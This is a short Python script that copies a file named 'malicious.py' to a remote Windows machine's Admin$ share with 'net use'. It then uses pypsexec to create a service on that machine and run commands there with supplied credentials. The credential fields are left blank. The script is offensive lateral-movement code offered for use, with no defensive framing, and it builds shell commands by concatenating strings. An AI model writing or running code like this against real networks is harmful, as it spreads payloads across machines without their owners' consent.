import os,winreg,shutil
from pypsexec.client import Client

def accessAdminShare(computerName,username,executable):
    remote = r"\\"+computerName+"\Admin$"
    local = "Z:"
    remotefile = local + "\\"+executable
    os.system("net use "+local+" "+remote + " /USER:"+username)
    shutil.copy(executable,remotefile)
    os.system("net use "+local+" /delete")
    
timeout = 1
def executeRemoteScript(computerName,username,password,executable,arguments):
    c = Client(computerName,username=username,password=password)
    c.connect()
    try:
        c.create_service()
        stdout,stderr,rc = c.run_executable(executable,arguments=arguments,timeout_seconds=timeout)
        print(stdout)
    finally:
        c.remove_service()
        c.disconnect()

computerName = ""
username = ""
password = ""
accessAdminShare(computerName,username,r"malicious.py")
executeRemoteScript(computerName,username,password,"cmd.exe","pwd")